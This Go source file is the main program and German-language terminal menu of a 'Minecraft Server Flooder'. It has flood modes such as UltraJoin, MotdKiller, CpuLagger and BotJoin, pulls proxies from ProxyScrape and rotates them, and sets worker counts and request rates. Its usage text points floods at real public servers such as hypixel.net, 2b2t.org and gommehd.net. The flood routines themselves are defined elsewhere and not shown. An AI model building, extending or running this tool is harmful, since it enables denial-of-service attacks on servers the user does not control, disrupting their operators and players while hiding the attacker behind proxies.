package main

import (
	"context"
	"flag"
	"fmt"
	"loadtest/minecraft_legit"
	"os"
	"strconv"
	"strings"
	"time"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
	"loadtest/utils"
)

type ProxyConfig struct {
	Protocol string
	Host     string
	Port     string
	Username string
	Password string
	Type     string
}

// Styles
var (
	titleStyle = lipgloss.NewStyle().
			Bold(true).
			Foreground(lipgloss.Color("#7D56F4")).
			MarginBottom(1)

	selectedStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#7D56F4")).
			Bold(true)

	normalStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#FFFFFF"))

	infoStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#00BFFF"))

	promptStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#FFD700"))

	helpStyle = lipgloss.NewStyle().
			Faint(true).
			Foreground(lipgloss.Color("#666666"))
)

type screen int

const (
	modeSelection screen = iota
	minecraftFloodTypeSelection
	minecraftServerConfig
	proxyConfig
	proxyInput
	workerConfig
	rpsConfig
	durationConfig
	loadTestServerConfig
	running
)

type model struct {
	screen      screen
	cursor      int
	choices     []string
	mode        string
	servers     []string
	workers     int
	rps         int
	duration    time.Duration
	floodType   string
	proxies     []ProxyConfig
	useRotating bool
	input       string
	inputMode   bool
	err         error
	quitting    bool
	proxyBuffer []string
	width       int
	height      int
}

func initialModel() model {
	return model{
		screen:  modeSelection,
		choices: []string{"Minecraft Server Flooder", "Load-Test"},
		workers: 50,
		rps:     100,
	}
}

func (m model) Init() tea.Cmd {
	return nil
}

func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case tea.WindowSizeMsg:
		m.width = msg.Width
		m.height = msg.Height

	case tea.KeyMsg:
		if m.inputMode {
			return m.handleInput(msg)
		}

		switch msg.String() {
		case "ctrl+c", "q":
			m.quitting = true
			return m, tea.Quit

		case "up", "k":
			if m.cursor > 0 {
				m.cursor--
			}

		case "down", "j":
			if m.cursor < len(m.choices)-1 {
				m.cursor++
			}

		case "enter":
			return m.handleEnter()
		}
	}

	return m, nil
}

func (m model) handleInput(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	switch msg.String() {
	case "enter":
		if m.screen == proxyInput {
			return m.processProxyInput()
		}
		return m.processInput()
	case "ctrl+c":
		m.quitting = true
		return m, tea.Quit
	case "ctrl+v", "ctrl+shift+v":
		return m, nil
	case "backspace":
		if len(m.input) > 0 {
			m.input = m.input[:len(m.input)-1]
		}
	case "esc":
		m.inputMode = false
		m.input = ""
	default:
		if len(msg.String()) == 1 {
			m.input += msg.String()
		}
	}
	return m, nil
}

func (m model) processProxyInput() (tea.Model, tea.Cmd) {
	if len(m.proxyBuffer) == 0 {
		m.proxyBuffer = append(m.proxyBuffer, m.input)
		m.input = ""
		return m, nil
	}

	proxyText := strings.Join(m.proxyBuffer, "\n")
	parsedProxies, err := parseProxyList(proxyText)
	if err != nil {
		m.err = err
		return m, nil
	}

	m.proxies = parsedProxies
	m.inputMode = false
	m.proxyBuffer = []string{}
	m.screen = workerConfig
	m.inputMode = true
	m.input = ""
	return m, nil
}

func (m model) processInput() (tea.Model, tea.Cmd) {
	switch m.screen {
	case minecraftServerConfig:
		servers := strings.Split(m.input, ",")
		for i := range servers {
			servers[i] = strings.TrimSpace(servers[i])
		}
		m.servers = servers
		m.inputMode = false
		m.screen = proxyConfig
		m.cursor = 0
		m.choices = []string{"Proxys verwenden", "Keine Proxys"}

	case loadTestServerConfig:
		m.servers = []string{strings.TrimSpace(m.input)}
		m.inputMode = false
		m.screen = proxyConfig
		m.cursor = 0
		m.choices = []string{"Proxys verwenden", "Keine Proxys"}

	case workerConfig:
		workers, err := strconv.Atoi(m.input)
		if err != nil || workers <= 0 {
			m.err = fmt.Errorf("ungültige Worker-Anzahl")
			return m, nil
		}
		m.workers = workers
		m.inputMode = false
		m.screen = rpsConfig
		m.inputMode = true
		m.input = ""

	case rpsConfig:
		rps, err := strconv.Atoi(m.input)
		if err != nil || rps <= 0 {
			m.err = fmt.Errorf("ungültige RPS-Anzahl")
			return m, nil
		}
		m.rps = rps
		m.inputMode = false
		m.screen = durationConfig
		m.inputMode = true
		m.input = ""

	case durationConfig:
		duration, err := strconv.Atoi(m.input)
		if err != nil || duration <= 0 {
			m.err = fmt.Errorf("ungültige Dauer")
			return m, nil
		}
		m.duration = time.Duration(duration) * time.Second
		m.inputMode = false
		return m.startTest()
	}

	return m, nil
}

func (m model) handleEnter() (tea.Model, tea.Cmd) {
	switch m.screen {
	case modeSelection:
		m.mode = []string{"minecraft", "loadtest"}[m.cursor]
		if m.mode == "minecraft" {
			m.screen = minecraftFloodTypeSelection
			m.cursor = 0
			m.choices = getFloodTypeChoices()
		} else {
			m.screen = loadTestServerConfig
			m.inputMode = true
			m.input = ""
		}

	case minecraftFloodTypeSelection:
		m.floodType = getFloodTypeFromIndex(m.cursor)
		m.screen = minecraftServerConfig
		m.inputMode = true
		m.input = ""

	case minecraftServerConfig:
		servers := strings.Split(m.input, ",")
		for i := range servers {
			servers[i] = strings.TrimSpace(servers[i])
		}
		m.servers = servers
		m.inputMode = false
		m.screen = proxyConfig
		m.cursor = 0
		m.choices = []string{"Proxys verwenden", "Keine Proxys"}

	case proxyConfig:
		if m.cursor == 0 {
			m.screen = proxyInput
			m.inputMode = true
			m.input = ""
			m.proxyBuffer = []string{}
		} else {
			m.proxies = []ProxyConfig{}
			m.screen = workerConfig
			m.inputMode = true
			m.input = ""
		}
	}

	return m, nil
}

func (m model) startTest() (tea.Model, tea.Cmd) {
	m.screen = running

	if m.mode == "minecraft" {
		if strings.HasPrefix(m.floodType, "legit_") {
			runMinecraftLegit(m.servers, m.workers, m.duration, m.floodType, m.proxies, m.useRotating)
		} else {
			flooder := NewMinecraftFlooder(m.servers, m.proxies, m.useRotating, m.workers, m.duration, m.floodType)
			utils.StartWithErrorHandling(flooder)
		}
	}

	time.Sleep(2 * time.Second)
	return m, tea.Quit
}

func centerText(text string, width int) string {
	if width <= 0 {
		return text
	}
	textWidth := len(text)
	if textWidth >= width {
		return text
	}
	padding := (width - textWidth) / 2
	return strings.Repeat(" ", padding) + text
}

func (m model) View() string {
	if m.quitting {
		return "Programm wird beendet...\n"
	}

	var s strings.Builder

	switch m.screen {
	case modeSelection:
		s.WriteString(titleStyle.Render("SERVER LOADTEST & MINECRAFT PINGER"))
		s.WriteString("\n\n")
		s.WriteString(infoStyle.Render("Wähle den Modus:"))
		s.WriteString("\n\n")
		for i, choice := range m.choices {
			cursor := " "
			if m.cursor == i {
				cursor = ">"
				s.WriteString(selectedStyle.Render(cursor + " " + choice))
			} else {
				s.WriteString(normalStyle.Render(cursor + " " + choice))
			}
			s.WriteString("\n")
		}

	case minecraftFloodTypeSelection:
		s.WriteString(titleStyle.Render("MINECRAFT FLOOD-TYP"))
		s.WriteString("\n\n")
		s.WriteString(infoStyle.Render("Wähle den Flood-Typ:"))
		s.WriteString("\n\n")
		for i, choice := range m.choices {
			cursor := " "
			if m.cursor == i {
				cursor = ">"
				s.WriteString(selectedStyle.Render(cursor + " " + choice))
			} else {
				s.WriteString(normalStyle.Render(cursor + " " + choice))
			}
			s.WriteString("\n")
		}

	case minecraftServerConfig:
		s.WriteString(titleStyle.Render("MINECRAFT SERVER KONFIGURATION"))
		s.WriteString("\n\n")
		s.WriteString(promptStyle.Render("Gib die Server ein (Komma-getrennt):"))
		s.WriteString("\n")
		s.WriteString(infoStyle.Render("Beispiel: hypixel.net:25565,2b2t.org:25565"))
		s.WriteString("\n\n")
		s.WriteString("> " + m.input)

	case loadTestServerConfig:
		s.WriteString(titleStyle.Render("LOAD-TEST KONFIGURATION"))
		s.WriteString("\n\n")
		s.WriteString(promptStyle.Render("Gib den Ziel-Server ein:"))
		s.WriteString("\n")
		s.WriteString(infoStyle.Render("Beispiel: example.com:80"))
		s.WriteString("\n\n")
		s.WriteString("> " + m.input)

	case proxyConfig:
		s.WriteString(titleStyle.Render("PROXY KONFIGURATION"))
		s.WriteString("\n\n")
		s.WriteString(infoStyle.Render("Möchtest du Proxys verwenden?"))
		s.WriteString("\n\n")
		for i, choice := range m.choices {
			cursor := " "
			if m.cursor == i {
				cursor = ">"
				s.WriteString(selectedStyle.Render(cursor + " " + choice))
			} else {
				s.WriteString(normalStyle.Render(cursor + " " + choice))
			}
			s.WriteString("\n")
		}

	case proxyInput:
		s.WriteString(titleStyle.Render("PROXY EINGABE"))
		s.WriteString("\n\n")
		s.WriteString(promptStyle.Render("Füge Proxys ein (ein Proxy pro Zeile):"))
		s.WriteString("\n")
		s.WriteString(infoStyle.Render("Format: protokoll://host:port oder host:port"))
		s.WriteString("\n")
		s.WriteString(infoStyle.Render("Drücke Enter zum Fortfahren"))
		s.WriteString("\n\n")
		if len(m.proxyBuffer) > 0 {
			s.WriteString("Eingefügte Proxys:\n")
			for _, proxy := range m.proxyBuffer {
				s.WriteString("  " + proxy + "\n")
			}
		}
		s.WriteString("> " + m.input)

	case workerConfig:
		s.WriteString(titleStyle.Render("WORKER KONFIGURATION"))
		s.WriteString("\n\n")
		s.WriteString(promptStyle.Render("Gib die Anzahl der Worker ein:"))
		s.WriteString("\n")
		s.WriteString(infoStyle.Render("Empfohlen: 50-200"))
		s.WriteString("\n\n")
		s.WriteString("> " + m.input)

	case rpsConfig:
		s.WriteString(titleStyle.Render("RPS KONFIGURATION"))
		s.WriteString("\n\n")
		s.WriteString(promptStyle.Render("Gib die Anfragen pro Sekunde ein:"))
		s.WriteString("\n")
		s.WriteString(infoStyle.Render("Empfohlen: 100-500"))
		s.WriteString("\n\n")
		s.WriteString("> " + m.input)

	case durationConfig:
		s.WriteString(titleStyle.Render("DAUER KONFIGURATION"))
		s.WriteString("\n\n")
		s.WriteString(promptStyle.Render("Gib die Testdauer in Sekunden ein:"))
		s.WriteString("\n")
		s.WriteString(infoStyle.Render("Empfohlen: 30-300"))
		s.WriteString("\n\n")
		s.WriteString("> " + m.input)

	case running:
		s.WriteString(titleStyle.Render("TEST LÄUFT"))
		s.WriteString("\n\n")
		s.WriteString(infoStyle.Render("Der Test wird ausgeführt..."))
		s.WriteString("\n")
		s.WriteString(infoStyle.Render("Überprüfe die Logs für Details."))
	}

	s.WriteString("\n")
	if m.inputMode {
		s.WriteString(helpStyle.Render("\nESC: Abbrechen | Ctrl+C: Beenden"))
	} else {
		s.WriteString(helpStyle.Render("\n↑/↓: Navigieren | Enter: Auswählen | Q/Ctrl+C: Beenden"))
	}
	s.WriteString("\n")

	return s.String()
}

func getFloodTypeChoices() []string {
	return []string{
		"UltraJoin (Massenhafte Joins)",
		"MotdKiller (MOTD Spam)",
		"CpuLagger (CPU Überlastung)",
		"FakeJoin (Fake Player Joins)",
		"BotJoin (Bot-Netzwerk)",
		"Legit: Authentication Request",
		"Legit: Real MOTD Request",
		"Legit: Big String",
		"Legit: Encryption Error",
		"Legit: Handshake",
		"Legit: Login Request",
		"Legit: Random Byte",
		"Legit: Status Request",
	}
}

func getFloodTypeFromIndex(i int) string {
	types := []string{
		"ultrajoin",
		"motdkiller",
		"cpulagger",
		"fakejoin",
		"botjoin",
		"legit_authentication",
		"legit_motd",
		"legit_bigstring",
		"legit_encryption",
		"legit_handshake",
		"legit_login",
		"legit_random",
		"legit_status",
	}
	if i < len(types) {
		return types[i]
	}
	return "ultrajoin"
}

func main() {
	var (
		mode               = flag.String("mode", "", "Modus: minecraft, loadtest")
		serverList         = flag.String("servers", "", "Komma-getrennte Server-Liste")
		workers            = flag.Int("workers", 50, "Anzahl der Worker")
		rpsVal             = flag.Int("rps", 100, "Anfragen pro Sekunde")
		durationVal        = flag.Int("duration", 60, "Testdauer in Sekunden")
		floodTypeVal       = flag.String("flood-type", "", "Flood-Typ für Minecraft")
		proxyFile          = flag.String("proxy-file", "", "Pfad zur Proxy-Datei")
		proxyList          = flag.String("proxy-list", "", "Komma-getrennte Proxy-Liste")
		proxyProtocol      = flag.String("proxy-protocol", "socks5", "Standard Proxy-Protokoll")
		useRotatingProxies = flag.Bool("use-rotating", true, "Proxy-Rotation aktivieren")
		testProxiesFlag    = flag.Bool("test-proxies", false, "Proxys vor dem Start testen")
		proxyScrapeFlag    = flag.Bool("proxy-scrape", false, "Proxys von ProxyScrape laden")
		proxyScrapeType    = flag.String("proxy-scrape-type", "socks5", "ProxyScrape Typ: socks5, http")
		protocolVersion    = flag.Int("protocol-version", 763, "Minecraft Protokoll-Version")
		debugLog           = flag.Bool("debug", false, "Debug-Logging aktivieren")
		fileLog            = flag.Bool("file-log", false, "In Datei loggen")
		help               = flag.Bool("help", false, "Hilfe anzeigen")
	)

	flag.Parse()

	logLevel := utils.LogLevelInfo
	if *debugLog {
		logLevel = utils.LogLevelDebug
	}

	utils.SetGlobalLogLevel(logLevel)
	if *fileLog {
		fmt.Println("File-Logging aktiviert: flooder.log")
	}

	if *help {
		printUsage()
		return
	}

	if *mode != "" {
		runWithCommandLine(*mode, *serverList, *workers, *rpsVal, *durationVal,
			*floodTypeVal, *proxyFile, *proxyList, *proxyProtocol, *useRotatingProxies,
			*testProxiesFlag, *proxyScrapeFlag, *proxyScrapeType, *protocolVersion,
			*debugLog, *fileLog)
		return
	}

	p := tea.NewProgram(initialModel(), tea.WithAltScreen())
	if _, err := p.Run(); err != nil {
		fmt.Printf("Fehler: %v\n", err)
		os.Exit(1)
	}
}

func printUsage() {
	fmt.Println("SERVER LASTTEST & MINECRAFT PINGER - Command Line Usage")
	fmt.Println(strings.Repeat("=", 70))
	fmt.Println()
	fmt.Println("BEISPIELE:")
	fmt.Println()
	fmt.Println("1. Minecraft Server Flooder:")
	fmt.Println("   ./flooder -mode=minecraft -servers=\"hypixel.net,2b2t.org\" -workers=50 -rps=100 -duration=60 -flood-type=ultrajoin")
	fmt.Println()
	fmt.Println("2. Minecraft Legit Authentication:")
	fmt.Println("   ./flooder -mode=minecraft -servers=\"hypixel.net\" -workers=20 -duration=30 -flood-type=legit_authentication -protocol-version=763")
	fmt.Println()
	fmt.Println("3. Mit Proxy-Datei:")
	fmt.Println("   ./flooder -mode=minecraft -servers=\"hypixel.net\" -workers=20 -rps=50 -duration=30 -flood-type=motdkiller -proxy-file=\"proxies.txt\"")
	fmt.Println()
	fmt.Println("4. Mit ProxyScrape:")
	fmt.Println("   ./flooder -mode=minecraft -servers=\"gommehd.net\" -workers=30 -rps=75 -duration=45 -flood-type=cpulagger -proxy-scrape -proxy-scrape-type=socks5")
	fmt.Println()
	fmt.Println("5. Legit Random Byte Method:")
	fmt.Println("   ./flooder -mode=minecraft -servers=\"hypixel.net\" -workers=15 -duration=20 -flood-type=legit_random -proxy-list=\"proxy1.com:1080,proxy2.com:1080\"")
	fmt.Println()
	fmt.Println("6. Load-Test:")
	fmt.Println("   ./flooder -mode=loadtest -servers=\"example.com:80\" -workers=100 -rps=200 -duration=30")
	fmt.Println()
	fmt.Println("MINECRAFT LEGIT METHODEN:")
	fmt.Println("   legit_authentication  - Login-Versuch mit zufälligem Username")
	fmt.Println("   legit_motd           - Server-Status-Anfrage")
	fmt.Println("   legit_bigstring      - Großer zufälliger String")
	fmt.Println("   legit_encryption     - Encryption-Fehler simulieren")
	fmt.Println("   legit_handshake      - Nur Handshake-Paket")
	fmt.Println("   legit_login          - Login mit Zähler")
	fmt.Println("   legit_random         - Zufällige Bytes (5-65539)")
	fmt.Println("   legit_status         - Status + Ping Packet")
	fmt.Println()
	fmt.Println("FLAGS:")
	flag.PrintDefaults()
}

func runWithCommandLine(mode, serverList string, workers, rpsVal, durationVal int,
	floodTypeVal, proxyFile, proxyList, proxyProtocol string, useRotatingProxies,
	testProxiesFlag, proxyScrapeFlag bool, proxyScrapeType string, protocolVersion int,
	debug, fileLog bool) {

	if serverList == "" {
		utils.Fatal("Server-Liste ist erforderlich. Verwende -servers=\"server1,server2\"")
	}

	if workers <= 0 {
		utils.Fatal("Worker-Anzahl muss größer als 0 sein")
	}

	if rpsVal <= 0 && mode != "minecraft" {
		utils.Fatal("RPS muss größer als 0 sein")
	}

	if durationVal <= 0 {
		utils.Fatal("Dauer muss größer als 0 sein")
	}

	var proxies []ProxyConfig

	if proxyScrapeFlag {
		proxies = loadProxiesFromProxyScrape(proxyScrapeType)
	} else if proxyFile != "" {
		loadedProxies, err := loadProxiesFromFile(proxyFile)
		if err != nil {
			utils.Fatal("Fehler beim Laden der Proxy-Datei: %v", err)
		}
		proxies = loadedProxies
	} else if proxyList != "" {
		proxies = parseCommandLineProxyList(proxyList, proxyProtocol)
	}

	if testProxiesFlag && len(proxies) > 0 {
		utils.Info("Teste Proxys...")
		workingProxies, _, _ := testProxiesParallel(proxies, 20)
		proxies = workingProxies
		utils.Info("Funktionierende Proxys: %d", len(proxies))
	}

	duration := time.Duration(durationVal) * time.Second

	if mode == "minecraft" {
		if strings.HasPrefix(floodTypeVal, "legit_") {
			runMinecraftLegitCommandLine(serverList, workers, duration, floodTypeVal,
				proxies, useRotatingProxies, int32(protocolVersion))
		} else {
			runMinecraftFlooderCommandLine(serverList, workers, rpsVal, duration,
				floodTypeVal, proxies, useRotatingProxies)
		}
	} else if mode == "loadtest" {
		runLoadTestCommandLine(serverList, workers, rpsVal, duration, proxies, useRotatingProxies)
	} else {
		utils.Fatal("Ungültiger Modus: %s. Verwende 'minecraft' oder 'loadtest'", mode)
	}
}

func parseCommandLineProxyList(proxyList, protocol string) []ProxyConfig {
	var proxies []ProxyConfig
	proxyEntries := strings.Split(proxyList, ",")
	for _, entry := range proxyEntries {
		entry = strings.TrimSpace(entry)
		if entry == "" {
			continue
		}

		parts := strings.Split(entry, ":")
		if len(parts) < 2 {
			utils.Warning("Ungültiges Proxy-Format: %s", entry)
			continue
		}

		proxies = append(proxies, ProxyConfig{
			Protocol: protocol,
			Host:     parts[0],
			Port:     parts[1],
		})
	}
	return proxies
}

func loadProxiesFromProxyScrape(scrapeType string) []ProxyConfig {
	var apiURL string
	var preferredProtocol string

	switch scrapeType {
	case "socks5":
		apiURL = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all"
		preferredProtocol = "socks5"
	case "http":
		apiURL = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
		preferredProtocol = "http"
	default:
		apiURL = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all"
		preferredProtocol = "socks5"
	}

	proxies, err := downloadProxiesFromAPI(apiURL, preferredProtocol)
	if err != nil {
		utils.Error("Fehler beim Laden von ProxyScrape: %v", err)
		return []ProxyConfig{}
	}

	return proxies
}

func runMinecraftLegitCommandLine(serverList string, workers int, duration time.Duration,
	floodTypeVal string, proxies []ProxyConfig, useRotating bool, protocolVersion int32) {

	servers := strings.Split(serverList, ",")
	for i := range servers {
		servers[i] = strings.TrimSpace(servers[i])
	}

	if floodTypeVal == "" {
		floodTypeVal = "legit_authentication"
		utils.Info("Kein Flood-Typ angegeben, verwende: %s", floodTypeVal)
	}

	// Konvertiere Flood-Typ zu Method-Name
	methodName := strings.TrimPrefix(floodTypeVal, "legit_")

	utils.Info("Starte Minecraft Legit Bot...")
	utils.Info("Methode: %s, Protokoll: %d", methodName, protocolVersion)
	utils.Info("Server: %d, Worker: %d, Dauer: %v", len(servers), workers, duration)
	utils.Info("Proxys: %d (Rotation: %v)", len(proxies), useRotating)

	// Konvertiere ProxyConfig zu minecraft_legit.ProxyConfig
	legitProxies := make([]minecraft_legit.ProxyConfig, len(proxies))
	for i, p := range proxies {
		legitProxies[i] = minecraft_legit.ProxyConfig{
			Protocol: p.Protocol,
			Host:     p.Host,
			Port:     p.Port,
			Username: p.Username,
			Password: p.Password,
			Type:     p.Type,
		}
	}

	legit := minecraft_legit.NewMinecraftLegit(servers, legitProxies, useRotating,
		workers, duration, methodName, protocolVersion)

	ctx := context.Background()
	if err := legit.Start(ctx); err != nil {
		utils.Error("Fehler beim Ausführen: %v", err)
	}
}

func runMinecraftFlooderCommandLine(serverList string, workers, rps int,
	duration time.Duration, floodTypeVal string, proxies []ProxyConfig, useRotating bool) {

	servers := strings.Split(serverList, ",")
	for i := range servers {
		servers[i] = strings.TrimSpace(servers[i])
	}

	if floodTypeVal == "" {
		floodTypeVal = "ultrajoin"
		utils.Info("Kein Flood-Typ angegeben, verwende: %s", floodTypeVal)
	}

	utils.Info("Starte Minecraft Server Flooder...")
	utils.Info("Server: %d, Worker: %d, Floods/s: %d, Dauer: %v, Typ: %s",
		len(servers), workers, rps, duration, floodTypeVal)
	utils.Info("Proxys: %d (Rotation: %v)", len(proxies), useRotating)

	flooder := NewMinecraftFlooder(servers, proxies, useRotating, workers, duration, floodTypeVal)
	utils.StartWithErrorHandling(flooder)
}

func runLoadTestCommandLine(serverList string, workers, rps int,
	duration time.Duration, proxies []ProxyConfig, useRotating bool) {

	servers := strings.Split(serverList, ",")
	if len(servers) > 1 {
		utils.Warning("Load-Test unterstützt nur einen Server. Verwende: %s", servers[0])
	}

	targetServer := strings.TrimSpace(servers[0])

	tester, err := NewLoadTester(targetServer, workers, rps, duration)
	if err != nil {
		utils.Fatal("Fehler beim Erstellen des Load Testers: %v", err)
	}

	tester.useRotating = useRotating

	if len(proxies) > 0 {
		var addErrors []string
		for _, p := range proxies {
			err := tester.AddProxy(p.Host, p.Port, p.Protocol, p.Username, p.Password)
			if err != nil {
				addErrors = append(addErrors, err.Error())
			}
		}

		if len(addErrors) > 0 && len(addErrors) < 10 {
			for _, errMsg := range addErrors {
				utils.Warning("Proxy-Fehler: %s", errMsg)
			}
		}

		if len(tester.proxies) == 0 {
			utils.Fatal("Keine gültigen Proxys verfügbar")
		}
	}

	utils.Info("Starte Load-Test...")
	utils.Info("Server: %s, Worker: %d, RPS: %d, Dauer: %v",
		targetServer, workers, rps, duration)
	utils.Info("Proxys: %d (Rotation: %v)", len(proxies), useRotating)

	tester.Start()
}

func runMinecraftLegit(servers []string, workers int, duration time.Duration,
	floodType string, proxies []ProxyConfig, useRotating bool) {

	methodName := strings.TrimPrefix(floodType, "legit_")

	// Konvertiere ProxyConfig zu minecraft_legit.ProxyConfig
	legitProxies := make([]minecraft_legit.ProxyConfig, len(proxies))
	for i, p := range proxies {
		legitProxies[i] = minecraft_legit.ProxyConfig{
			Protocol: p.Protocol,
			Host:     p.Host,
			Port:     p.Port,
			Username: p.Username,
			Password: p.Password,
			Type:     p.Type,
		}
	}

	legit := minecraft_legit.NewMinecraftLegit(servers, legitProxies, useRotating,
		workers, duration, methodName, 763)

	ctx := context.Background()
	if err := legit.Start(ctx); err != nil {
		utils.Error("Fehler beim Ausführen: %v", err)
	}
}
